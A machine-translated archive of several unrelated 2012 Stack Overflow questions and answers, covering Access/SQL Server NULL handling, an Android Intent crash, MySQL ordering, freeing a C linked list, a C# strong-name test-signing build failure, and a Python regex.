> 
> 赞同：0
> 
> 时间：2012-11-11T06:03:40.110
> 
> 标签：sql, sql-server, ms-access

Access 2003 中的输出：

身份证 | *说明* | 数量 | 标题 | 对象
--------------------------------------------------------------- --------------------

17 | **6** | 253000.00 | |
18 | **7** | 330000.00 | |
19 | **1** | 340000.00 | 8414 | 69327
22 | **2** | 120000.00 | 8414 | 69344
23 | **3** | 615000.00 | 8414 | 69327
24 | **4** | 320000.00 | 8414 | 69327
25 | **5** | 809500.00 | 8414 | 69327

询问 ：

```
SELECT      TVFundBillDetail.ID ,
            TVFundBillDetail.HID ,
            TVFundBillDetail.Description ,
            TVFundBillDetail.Quantity ,
            TVFundBillDetail.Title ,
            TVTitle.Name TitleName ,
            Obj ,
            TVAllObjects.Name ObjName
     FROM   TVFundBillDetail
            LEFT OUTER JOIN TVTitle ON TVFundBillDetail.Title = TVTitle.Code
            LEFT OUTER JOIN TVAllObjects ON TVFundBillDetail.Obj = TVAllObjects.Code 
```

问题：输入行序列显示在描述列中。当 title 和 obj 为 null 时，则替换输入行的序列。应用程序是 access 2003 而 DBMS 是 SQL Server 2000

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T07:24:54.887

There are probably many ways to achieve this. For Access, you can simply use `Nz()` in your query, like this:

```
...
Nz(TVFundBillDetail.Title, "    ")
... 
```

If `Title` is `NULL`, you'll get 4 spaces (or you can use `"0000"` if you prefer).

For SQL server, an equivalent function is `COALESCE()`:

```
...
COALESCE(TVFundBillDetail.Title, "    ")
... 
```

If you're using the query as a normal Qccess query, the first one will work. If you're using a pass-through query, or exposing a SQL Server view, the second one will work.

# android-intent - 带有 Intent 的 NullPointerException 错误

> ID：13328985
> 
> 赞同：0
> 
> 时间：2012-11-11T06:03:45.177
> 
> 标签：android-intent, nullpointerexception

单击 button1 后立即出现空指针异常错误。但我不确定路径原因是什么。有人可以帮助我吗？

```
public class FirstActivity extends Activity {
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    Button button1 = (Button)findViewById(R.id.button1);
    button1.setOnClickListener(new ButtonClickListener());
}
class ButtonClickListener implements OnClickListener {
    public void onClick(View v){
        EditText name = (EditText)findViewById(R.id.name);
        EditText address = (EditText)findViewById(R.id.address);

        Spinner month = (Spinner)findViewById(R.id.month);
        Spinner day = (Spinner)findViewById(R.id.day);

        RadioGroup radio = (RadioGroup)findViewById(R.id.gendar);
        RadioButton radiobutton=
                (RadioButton)findViewById(radio.getCheckedRadioButtonId());

        CheckBox applecheck = (CheckBox)findViewById(R.id.applecheck);
        CheckBox orangecheck = (CheckBox)findViewById(R.id.orangecheck);
        CheckBox peachcheck = (CheckBox)findViewById(R.id.peachcheck);

        EditText appleqty = (EditText)findViewById(R.id.appleqty);
        EditText orangeqty = (EditText)findViewById(R.id.orangeqty);
        EditText peachqty = (EditText)findViewById(R.id.peachqty);

        Intent intent = new Intent(FirstActivity.this,SecondActivity.class);

        intent.putExtra("NAME", name.getText().toString());
        intent.putExtra("ADDRESS", address.getText().toString());
        intent.putExtra("MONTH",month.getSelectedItem().toString());
        intent.putExtra("DAY", day.getSelectedItem().toString());
        intent.putExtra("GENDAR", radiobutton.getText().toString());
        if(applecheck.isChecked())
            intent.putExtra("APPLE", appleqty.getText().toString());
        if(orangecheck.isChecked())
            intent.putExtra("ORANGE", orangeqty.getText().toString());
        if(peachcheck.isChecked())
            intent.putExtra("PEACH", peachqty.getText().toString());

        startActivity(intent);

    }
} 
```

}

```
public class SecondActivity extends Activity {
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_second);

    Bundle extra= getIntent().getExtras();

    String name = extra.getString("NAME");
    String address = extra.getString("ADDRESS");
    String month = extra.getString("MONTH");
    String day = extra.getString("DAY");
    String gendar = extra.getString("GENDAR");
    String apple = extra.getString("APPLE");
    String orange = extra.getString("ORANGE");
    String peach = extra.getString("PEACH"); 
```

11-11 14:38:38.681：E/AndroidRuntime(363)：致命异常：主要 11-11 14:38:38.681：E/AndroidRuntime(363)：java.lang.NullPointerException 11-11 14:38:38.681： E/AndroidRuntime(363): 在 com.example.sample4_3.FirstActivity$ButtonClickListener.onClick(FirstActivity.java:34) 11-11 14:38:38.681: E/AndroidRuntime(363): 在 android.view.View.performClick (View.java:2408) 11-11 14:38:38.681: E/AndroidRuntime(363): 在 android.view.View$PerformClick.run(View.java:8816) 11-11 14:38:38.681: E /AndroidRuntime(363): 在 android.os.Handler.handleCallback(Handler.java:587) 11-11 14:38:38.681: E/AndroidRuntime(363): 在 android.os.Handler.dispatchMessage(Handler.java: 92) 11-11 14:38:38.681: E/AndroidRuntime(363): 在 android.os.Looper.loop(Looper.java:123) 11-11 14:38:38.681: E/AndroidRuntime(363): 在android.app.ActivityThread.main(ActivityThread.java:4627) 11-11 14:38:38.681: E/AndroidRuntime(363): 在 java.lang.reflect.Method.invokeNative(Native Method) 11-11 14:38:38.681: E/AndroidRuntime(363): 在 java .lang.reflect.Method.invoke(Method.java:521) 11-11 14:38:38.681: E/AndroidRuntime(363): 在 com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java: 868)

我遇到的新错误如下；11-11 16:24:39.680: E/AndroidRuntime(554): java.lang.RuntimeException: 无法启动活动 ComponentInfo{com.example.sample4_3/com.example.sample4_3.SecondActivity}: android.view.InflateException: 二进制XML 文件第 126 行：膨胀类 textView 11-11 16:24:39.680 时出错：E/AndroidRuntime(554)：在 android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2663) 11-11 16:24:39.680： E/AndroidRuntime(554): 在 android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2679) 11-11 16:24:39.680: E/AndroidRuntime(554): 在 android.app.ActivityThread.access$2300(ActivityThread. java:125) 11-11 16:24:39.680: E/AndroidRuntime(554): 在 android.app.ActivityThread$H.handleMessage(ActivityThread.java:2033) 11-11 16:24:39.680: E/AndroidRuntime( 554）：在 android.os.Handler.dispatchMessage（处理程序。

好吧，即使我检查了第 126 行，我也找不到解决此错误的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T06:20:39.603

您能否突出显示第 34 行。但是从您的代码中我可以很容易地看出`ButtonClickListener`，您正在访问`findViewById`而不使用作为参数传入的视图。我不确定为什么那不是错误，因为您不应该这样做。可能是问题的另一件事是`R.id.button1`可能拼写错误，或者在 xml 中拼写错误。

# mysql - MySQL 是否维护您正在查询的表的顺序

> ID：13328986
> 
> 赞同：0
> 
> 时间：2012-11-11T06:04:48.517
> 
> 标签：mysql, sql-order-by, distinct, ranking

我正在使用 MySQL，并且我有一个包含玩家分数的表，单个玩家可以记录多个分数。我试图找到使用 MySQL ORDER BY 关键字对玩家进行排名的最佳方法。

现在我正在做的是：

```
SELECT DISTINCT t.userName FROM (SELECT userName, score FROM scoreTable ORDER BY score DESC) t; 
```

为了使用它对其进行排名，我假设子查询的顺序由主查询维护。

这个假设正确吗？到目前为止，我所有的测试都正确地维护了订单。是否存在不起作用的情况？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T06:10:44.223

以下内容对您有用吗？

```
SELECT userName, MAX(score) AS max_score 
FROM scoreTable GROUP BY username 
ORDER BY max_score DESC 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T06:09:51.900

我不相信这是有保证的行为，但通常是的。`ORDER BY`如果您希望以这种方式排序最终结果，最好在外部查询上使用。

# c - 释放整个链表，这个算法正确吗？

> ID：13328987
> 
> 赞同：1
> 
> 时间：2012-11-11T06:04:58.583
> 
> 标签：c, recursion, linked-list, free

这可能吗？还是会有丢失的清单？因为我无法检查它是否工作

```
void FreeRecurs(struct nodeTag *pFirst)
{
    if(pFirst != NULL)
    {   
            FreeRecurs(pFirst -> pNext);
            free(pFirst);
    }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-11T06:07:53.677

这会起作用，但是在长列表中，您可能会遇到堆栈溢出，因为您递归了很多并且没有使用尾递归。我会转向迭代版本：

*   虽然当前节点不为 NULL：
    *   存储指向下一个节点的指针。
    *   释放当前节点。
    *   使用您在释放之前存储的指针开始处理下一个节点。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T06:15:34.260

理论上这没问题，但你可以通过使其尾递归来很大程度上改进它：

```
void FreeRecurs(struct nodeTag *pFirst)
{
    if(pFirst != NULL)
    {   
            struct nodeTag* const next = pFirst->pNext;
            free(pFirst);
            FreeRecurs(next);
    }
} 
```

请注意，这`FreeRecurs(next)`是您函数中的最后一条语句。编译器会识别这一点，您的代码将运行得更快，并且不会冒破坏堆栈的风险。

除此之外，当您不确定是否丢失了内存时，您可以在`valgrind`（特别是在`massif`）中运行程序，它会告诉您是否丢失了内存。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T06:06:55.127

该算法将起作用。也就是说，你应该学习使用类似的工具，`valgrind`或者`gdb`准确地监控你的代码发生了什么，这样你就可以判断它是否在工作。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-11T06:08:43.250

我不会使用递归，而是使用这样的东西：

```
void FreeRecurs(struct nodeTag *pFirst)
{
    struct nodeTag *aux = NULL;
    while (pFirst != NULL)
    {   
        aux = pFirst;
        pFirst = pFirst -> pNext;
        free(aux);
    }
} 
```

递归会导致堆栈溢出，实际上最终会变慢，因为每个函数调用都有一个新的调用堆栈，实际上是什么都没有创建。

# c# - 在 sn.exe 上构建失败

> ID：13328992
> 
> 赞同：0
> 
> 时间：2012-11-11T06:05:35.563
> 
> 标签：c#, visual-studio-2010, math.net

我正在尝试构建一个用 C# ( [Math.NET Iridium](https://github.com/mathnet/mathnet-iridium) ) 编写的（看似未维护的）免费软件项目。

构建因此错误而失败：

`Error 1 The command ""C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\bin\sn.exe" -Vr *,"c061a3ec32cc0c6f" "C:\Users\dharmatech\Documents\mathnet-iridium - a\src\app\MathNet.Iridium\Library\..\..\..\..\config\personal_test_public.snk"" exited with code 1. C:\Users\dharmatech\Documents\mathnet-iridium - a\src\app\MathNet.Iridium\Library\Iridium.csproj 252 5 Iridium`

有关如何解决该错误的任何建议？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T06:34:08.020

问题是维护 Iridium 的人已经修改了 iridium.csproj 以测试对 dll 进行签名。

只需在记事本中打开位于“..\mathnet-iridium-master\mathnet-iridium-master\src\app\MathNet.Iridium\Library\Iridium.csproj”的 csproj 并删除（第 235 行）之间的部分：

!-- MATHNET-BEGIN-TESTSIGNING --

!-- MATHNET-END-TESTSIGNING --

保存 csproj 并再次构建。

有关 csproj 的信息如下：

```
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProductVersion>8.0.50727</ProductVersion>
    <SchemaVersion>2.0</SchemaVersion>
    <ProjectGuid>{26FC15DE-EFDA-403A-8284-1E2A4AE8A9D8}</ProjectGuid>
    <OutputType>Library</OutputType>
    <AppDesignerFolder>Properties</AppDesignerFolder>
    <RootNamespace>MathNet.Numerics</RootNamespace>
    <AssemblyName>MathNet.Iridium</AssemblyName>
    <ApplicationIcon>
    </ApplicationIcon>
    <SignAssembly>false</SignAssembly>
    <AssemblyOriginatorKeyFile>Properties\mathnet_public.snk</AssemblyOriginatorKeyFile>
    <DelaySign>false</DelaySign>
    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
    <FileUpgradeFlags>
    </FileUpgradeFlags>
    <UpgradeBackupLocation>
    </UpgradeBackupLocation>
    <OldToolsVersion>2.0</OldToolsVersion>
    <PublishUrl>publish\</PublishUrl>
    <Install>true</Install>
    <InstallFrom>Disk</InstallFrom>
    <UpdateEnabled>false</UpdateEnabled>
    <UpdateMode>Foreground</UpdateMode>
    <UpdateInterval>7</UpdateInterval>
    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
    <UpdatePeriodically>false</UpdatePeriodically>
    <UpdateRequired>false</UpdateRequired>
    <MapFileExtensions>true</MapFileExtensions>
    <ApplicationRevision>0</ApplicationRevision>
    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
    <IsWebBootstrapper>false</IsWebBootstrapper>
    <UseApplicationTrust>false</UseApplicationTrust>
    <BootstrapperEnabled>true</BootstrapperEnabled>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>..\..\..\..\build\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
    <UseVSHostingProcess>true</UseVSHostingProcess>
    <OutputType>Library</OutputType>
    <AssemblyName>MathNet.Iridium</AssemblyName>
    <RootNamespace>MathNet.Numerics</RootNamespace>
    <AllowUnsafeBlocks>false</AllowUnsafeBlocks>
    <CheckForOverflowUnderflow>true</CheckForOverflowUnderflow>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>..\..\..\..\build\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
    <DocumentationFile>..\..\..\..\build\Release\MathNet.Iridium.xml</DocumentationFile>
    <OutputType>Library</OutputType>
    <AssemblyName>MathNet.Iridium</AssemblyName>
    <DebugSymbols>false</DebugSymbols>
    <RootNamespace>MathNet.Numerics</RootNamespace>
    <AllowUnsafeBlocks>false</AllowUnsafeBlocks>
    <CheckForOverflowUnderflow>false</CheckForOverflowUnderflow>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Data" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Combinatorics.cs" />
    <Compile Include="Complex.cs" />
    <Compile Include="ComplexPolynomial.cs" />
    <Compile Include="ComplexRational.cs" />
    <Compile Include="Constants.cs" />
    <Compile Include="Distributions\Continuous\BetaDistribution.cs" />
    <Compile Include="Distributions\Continuous\CauchyLorentzDistribution.cs" />
    <Compile Include="Distributions\Continuous\ChiSquareDistribution.cs" />
    <Compile Include="Distributions\Continuous\ContinuousUniformDistribution.cs" />
    <Compile Include="Distributions\Continuous\ChiDistribution.cs" />
    <Compile Include="Distributions\Continuous\RayleighDistribution.cs" />
    <Compile Include="Distributions\Continuous\StudentsTDistribution.cs" />
    <Compile Include="Distributions\Continuous\ErlangDistribution.cs" />
    <Compile Include="Distributions\Continuous\ExponentialDistribution.cs" />
    <Compile Include="Distributions\Continuous\FisherSnedecorDistribution.cs" />
    <Compile Include="Distributions\Continuous\GammaDistribution.cs" />
    <Compile Include="Distributions\Continuous\LaplaceDistribution.cs" />
    <Compile Include="Distributions\Continuous\LognormalDistribution.cs" />
    <Compile Include="Distributions\Continuous\NormalDistribution.cs" />
    <Compile Include="Distributions\Continuous\ParetoDistribution.cs" />
    <Compile Include="Distributions\Continuous\StableDistribution.cs" />
    <Compile Include="Distributions\Continuous\StandardDistribution.cs" />
    <Compile Include="Distributions\Continuous\TriangularDistribution.cs" />
    <Compile Include="Distributions\DiscreteDistribution.cs" />
    <Compile Include="Distributions\Discrete\ArbitraryDistribution.cs" />
    <Compile Include="Distributions\Discrete\BernoulliDistribution.cs" />
    <Compile Include="Distributions\Discrete\BinomialDistribution.cs" />
    <Compile Include="Distributions\Discrete\HypergeometricDistribution.cs" />
    <Compile Include="Distributions\Discrete\DiscreteUniformDistribution.cs" />
    <Compile Include="Distributions\Discrete\GeometricDistribution.cs" />
    <Compile Include="Distributions\Discrete\PoissonDistribution.cs" />
    <Compile Include="Distributions\Discrete\ZipfDistribution.cs" />
    <Compile Include="Distributions\IDiscreteGenerator.cs" />
    <Compile Include="Distributions\IContinuousGenerator.cs" />
    <Compile Include="Distributions\IContinuousProbabilityDistribution.cs" />
    <Compile Include="Distributions\ContinuousDistribution.cs" />
    <Compile Include="Distributions\IDiscreteProbabilityDistribution.cs" />
    <Compile Include="Equations\ScalarIterator.cs" />
    <Compile Include="Equations\Solver.cs" />
    <Compile Include="IAlmostEquatable.cs" />
    <Compile Include="Integration\Algorithms\DoubleExponentialTransformation.cs" />
    <Compile Include="Integration\Algorithms\SimpsonRule.cs" />
    <Compile Include="Integration\Algorithms\TrapeziumRule.cs" />
    <Compile Include="Integration\Integrate.cs" />
    <Compile Include="Interpolation\Algorithms\AkimaSplineInterpolation.cs" />
    <Compile Include="Interpolation\Algorithms\BarycentricInterpolation.cs" />
    <Compile Include="Interpolation\Algorithms\ChebyshevFirstKindPolynomialInterpolation.cs" />
    <Compile Include="Interpolation\Algorithms\ChebyshevSecondKindPolynomialInterpolation.cs" />
    <Compile Include="Interpolation\Algorithms\CubicHermiteSplineInterpolation.cs" />
    <Compile Include="Interpolation\Algorithms\CubicSplineInterpolation.cs" />
    <Compile Include="Interpolation\Algorithms\EquidistantPolynomialInterpolation.cs" />
    <Compile Include="Interpolation\Algorithms\LimitedOrderPolynomialInterpolation.cs" />
    <Compile Include="Interpolation\Algorithms\LimitedOrderRationalInterpolation.cs" />
    <Compile Include="Interpolation\Algorithms\LinearSplineInterpolation.cs" />
    <Compile Include="Interpolation\Algorithms\PolynomialInterpolation.cs" />
    <Compile Include="Interpolation\Algorithms\RationalPoleFreeInterpolation.cs" />
    <Compile Include="Interpolation\Algorithms\RationalInterpolation.cs" />
    <Compile Include="Interpolation\Algorithms\SplineInterpolation.cs" />
    <Compile Include="Interpolation\Interpolation.cs" />
    <Compile Include="Interpolation\InterpolationMethod.cs" />
    <Compile Include="Interpolation\SplineBoundaryCondition.cs" />
    <Compile Include="LinearAlgebra\Algorithms\Orthogonal.cs" />
    <Compile Include="LinearAlgebra\ComplexMatrix.cs" />
    <Compile Include="LinearAlgebra\ComplexVector.cs" />
    <Compile Include="LinearAlgebra\IMatrix.cs" />
    <Compile Include="LinearAlgebra\IVector.cs" />
    <Compile Include="LinearAlgebra\Vector.cs" />
    <Compile Include="NumberTheory\IntegerTheory.cs" />
    <Compile Include="Properties\LocalStrings.cs" />
    <Compile Include="RandomSources\CryptographicRandomSource.cs" />
    <Compile Include="RandomSources\ObjectModel\RandomByteSourceAdapter.cs" />
    <Compile Include="Searching.cs" />
    <Compile Include="Sorting.cs" />
    <Compile Include="OnDemandComputation.cs" />
    <Compile Include="RandomSources\AdditiveLaggedFibonacciRandomSource.cs" />
    <Compile Include="RandomSources\MersenneTwisterRandomSource.cs" />
    <Compile Include="RandomSources\RandomSource.cs" />
    <Compile Include="Interpolation\Interpolation1D.cs" />
    <Compile Include="Interpolation\InterpolationAlgorithm.cs" />
    <Compile Include="Interpolation\PolynomialInterpolationAlgorithm.cs" />
    <Compile Include="Interpolation\RationalInterpolationAlgorithm.cs" />
    <Compile Include="IRealFunction.cs" />
    <Compile Include="LinearAlgebra\CholeskyDecomposition.cs" />
    <Compile Include="LinearAlgebra\EigenvalueDecomposition.cs" />
    <Compile Include="LinearAlgebra\LUDecomposition.cs" />
    <Compile Include="LinearAlgebra\Matrix.cs" />
    <Compile Include="LinearAlgebra\NamespaceDoc.cs" />
    <Compile Include="LinearAlgebra\QRDecomposition.cs" />
    <Compile Include="LinearAlgebra\SingularValueDecomposition.cs" />
    <Compile Include="Natural.cs" />
    <Compile Include="Number.cs" />
    <Compile Include="Polynomial.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
    <Compile Include="Quaternion.cs" />
    <Compile Include="RandomSources\SystemRandomSource.cs" />
    <Compile Include="RandomSources\XorShiftRandomSource.cs" />
    <Compile Include="Rational.cs" />
    <Compile Include="Ratios.cs" />
    <Compile Include="SampleList.cs" />
    <Compile Include="Set.cs" />
    <Compile Include="SiConstants.cs" />
    <Compile Include="SiPrefixes.cs" />
    <Compile Include="SpecialFunctions.cs" />
    <Compile Include="SpecialFunctions\Algorithms\BetaRegularizedAlgorithm.cs" />
    <Compile Include="SpecialFunctions\Algorithms\DigammaAlgorithm.cs" />
    <Compile Include="SpecialFunctions\Algorithms\ErrorFunctionAlgorithm.cs" />
    <Compile Include="SpecialFunctions\Algorithms\FactorialAlgorithm.cs" />
    <Compile Include="SpecialFunctions\Algorithms\GammaAlgorithm.cs" />
    <Compile Include="SpecialFunctions\Algorithms\GammaRegularizedAlgorithm.cs" />
    <Compile Include="Statistics\Accumulator.cs" />
    <Compile Include="Statistics\DescriptiveStatistics.cs" />
    <Compile Include="Statistics\Histogram.cs" />
    <Compile Include="Transformations\ComplexFourierTransformation.cs" />
    <Compile Include="Transformations\InternalFFT.cs" />
    <Compile Include="Transformations\RealFourierTransformation.cs" />
    <Compile Include="Transformations\TransformationConvention.cs" />
    <Compile Include="Trigonometry.cs" />
    <Compile Include="Tuple.cs" />
  </ItemGroup>
  <ItemGroup>
    <None Include="Properties\mathnet_public.snk" />
  </ItemGroup>
  <ItemGroup>
    <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5 SP1 Client Profile</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5 SP1</ProductName>
      <Install>true</Install>
    </BootstrapperPackage>
  </ItemGroup>
  <Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" />
  <!-- MATHNET-BEGIN-TESTSIGNING -->
  <Target Name="AfterBuild">
    <CallTarget Targets="TestSign" />
  </Target>
  <PropertyGroup>
    <NL>%0D%0A</NL>
    <QUOT>%22</QUOT>
  </PropertyGroup>
  <PropertyGroup>
    <RootPath>$(MSBuildProjectDirectory)\..\..\..\..\</RootPath>
    <ConfigPath>$(RootPath)config\</ConfigPath>
    <StrongNameTestKeyPrivateFullName>$(ConfigPath)personal_test_private.snk</StrongNameTestKeyPrivateFullName>
    <StrongNameTestKeyPublicFullName>$(ConfigPath)personal_test_public.snk</StrongNameTestKeyPublicFullName>
    <ProjectGuid>{26FC15DE-EFDA-403A-8284-1E2A4AE8A9D8}</ProjectGuid>
    <RootNamespace>MathNet.Numerics</RootNamespace>
  </PropertyGroup>
  <Target Name="TestSign">
    <GetFrameworkSdkPath>
      <Output TaskParameter="Path" PropertyName="FrameworkSdkPath" />
    </GetFrameworkSdkPath>
    <Error Condition="'$(FrameworkSdkPath)'==''" Text="Framework SDK not available." />
    <CreateItem Include="$(FrameworkSdkPath)bin\sn.exe" Condition="'@(StrongNameExe)'==''">
      <Output TaskParameter="Include" ItemName="StrongNameExe" />
    </CreateItem>
    <Error Condition="!Exists('@(StrongNameExe)')" Text="Strongname Tool not available." />
    <Exec Command="$(QUOT)@(StrongNameExe)$(QUOT) -k $(QUOT)$(StrongNameTestKeyPrivateFullName)$(QUOT)" Condition="!Exists($(StrongNameTestKeyPrivateFullName))" />
    <Exec Command="$(QUOT)@(StrongNameExe)$(QUOT) -p $(QUOT)$(StrongNameTestKeyPrivateFullName)$(QUOT) $(QUOT)$(StrongNameTestKeyPublicFullName)$(QUOT)" Condition="!Exists($(StrongNameTestKeyPublicFullName))" />
    <CreateItem Include="$(StrongNameTestKeyPrivateFullName)" Condition="'@(StrongNameTestKeyPrivate)'==''">
      <Output TaskParameter="Include" ItemName="StrongNameTestKeyPrivate" />
    </CreateItem>
    <Error Condition="!Exists('@(StrongNameTestKeyPrivate)')" Text="Test-signing private key not found (expected at @(StrongNameTestKeyPrivate)). Execute 'CreateNewPersonalTestKey.bat' once to generate one." />
    <Exec Command="$(QUOT)@(StrongNameExe)$(QUOT) -Vr *,$(QUOT)c061a3ec32cc0c6f$(QUOT) $(QUOT)$(StrongNameTestKeyPublicFullName)$(QUOT)" />
    <Message Text="$(NL)Test-Signing the target assembly $(TargetPath):$(NL)" />
    <Exec Command="$(QUOT)@(StrongNameExe)$(QUOT) -TS $(QUOT)$(TargetPath)$(QUOT) $(QUOT)@(StrongNameTestKeyPrivate)$(QUOT)" />
  </Target>
  <!-- MATHNET-END-TESTSIGNING -->
</Project> 
```

# python - 正则表达式来额外的字段

> ID：13328997
> 
> 赞同：2
> 
> 时间：2012-11-11T06:06:21.410
> 
> 标签：python, regex

给出下面的字符串：

```
';\n;20121110_160816\n;www.google.com\n\n; Test\na=5\n\nend\n' 
```

将字符串解析为以下字段的正则表达式是什么？：

```
;\n
;20121110_160816\n
;www.google.com\n
; Test\n 
```

我最初的失败尝试如下：

```
import re
m = re.search(';.+?\\n', mystr) 
```

输出：

```
m.group()
';20121110_160816\n' 
```

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T06:13:11.407

```
import re
re.findall('(;.*)\n', s) 
```

表达式演练：

1.  您的项目以“;”开头 ->';
2.  紧随其后的是任何数量的实际任何符号->“.*”“.”=任何符号“*”=0-无限次
3.  它以换行符结尾 -> "\n"
4.  为了便于阅读，我将重复-grp 放在括号中

但在这种情况下，您还应该考虑：

s.split()，如果没有补充参数，它会在换行符处自动分割。

**更新**- 评论您的评论 ;-)

我不确定我是否真的理解你关于问号的问题。但总的来说，星号、问号和加号都是量词。与 , 和 - 键类似，它们本身没有意义，单独使用时大多毫无价值。但是结合其他键/字符，它们会修改它们的行为，或者在量词的情况下指定是否和/或应该重复前面的字符/组多少次。